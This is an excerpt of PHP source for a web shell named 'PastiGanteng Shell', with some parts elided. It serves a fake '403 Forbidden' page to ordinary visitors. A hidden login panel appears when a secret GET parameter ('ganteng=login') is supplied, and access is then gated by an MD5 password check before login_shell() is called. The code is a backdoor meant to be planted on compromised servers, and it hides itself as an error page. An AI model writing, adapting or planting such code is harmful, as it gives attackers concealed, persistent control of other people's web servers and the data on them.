...
<head>
<?php 
$forbid = ($_SERVER['PHP_SELF']);
echo "<title>403 Forbidden</title>
</head>
<body><h1>Forbidden</h1>
<p>You don't have permission to access ".$forbid." on this server.</p>";
if($_GET['ganteng'] == 'login') {
echo '
<style>
...
<header>
<span style="font-size: 30px; font-weight: bold; font-style: italic;">PastiGanteng Shell</span>
<br>
...
<br>
<span style="color: #eee; size: 15px; font-family: Calibri; font-weight: bold;"> Hello </span><span style="font-family: Arial; font-style: italic; color: red; size: 15px;">'.$_SERVER['REMOTE_ADDR'].'</span>
</center>';
}
?>
<?php
...
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if(empty($psw) || (isset($_POST['pass']) && (md5($_POST['pass']) == $psw) )) {
        ...
        echo '<script type="text/javascript"> window.location="'.$forbid.'" </script>';
    }
    else {
        login_shell();
       }}
